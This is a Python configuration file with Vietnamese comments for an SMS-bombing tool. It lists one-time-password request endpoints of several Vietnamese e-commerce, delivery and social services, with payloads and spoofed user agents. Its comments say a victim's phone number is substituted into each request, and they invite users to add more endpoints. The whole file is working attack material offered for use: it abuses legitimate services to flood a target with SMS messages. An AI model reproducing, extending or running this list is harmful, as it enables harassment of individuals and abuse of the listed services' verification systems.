# -*- coding: utf-8 -*-

# Danh sách các API được sử dụng để gửi SMS
# {phone} sẽ được thay thế bằng số điện thoại của nạn nhân
# Lưu ý: Các API này có thể ngừng hoạt động bất cứ lúc nào.
# Bạn có thể tự tìm và thêm các API mới vào danh sách này.

API_LIST = [
    {
        "name": "Tiki",
        "method": "POST",
        "url": "https://api.tiki.vn/sc/v2/phone/request-otp",
        "data": {"phone_number": "{phone}"},
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Shopee",
        "method": "POST",
        "url": "https://shopee.vn/api/v2/authentication/resend_otp",
        "json": {
            "phone": "0{phone}",
            "operation": 5,
            "client_identifier": {
                "otp_code": ""
            }
        },
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Lazada",
        "method": "POST",
        "url": "https://api.lazada.vn/rest/user/request_otp",
        "data": {
            "phone": "0{phone}",
            "countryCode": "VN"
        },
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Meta", # Facebook/Instagram
        "method": "POST",
        "url": "https://i.instagram.com/api/v1/accounts/send_sms_code/",
        "data": {
            "phone_number": "+84{phone}",
            "device_id": "android-1234567890abcdef"
        },
        "headers": {"User-Agent": "Instagram 27.0.0.7.97 Android"}
    },
    {
        "name": "Vntrip",
        "method": "GET",
        "url": "https://www.vntrip.vn/sso-be/api/v1/user/request-otp-v2?phoneNumber=0{phone}",
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "ViettelPost",
        "method": "POST",
        "url": "https://www.viettelpost.com.vn/forgot-password/send-otp",
        "data": {"phone": "0{phone}"},
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "FPT Shop",
        "method": "POST",
        "url": "https://fptshop.com.vn/api/users/request-otp",
        "json": {"phone": "0{phone}"},
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json"
        }
    },
    {
        "name": "The Gioi Di Dong",
        "method": "POST",
        "url": "https://www.thegioididong.com/aj/users/request-otp",
        "data": {"PhoneNumber": "0{phone}"},
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    # Thêm các API khác vào đây
]
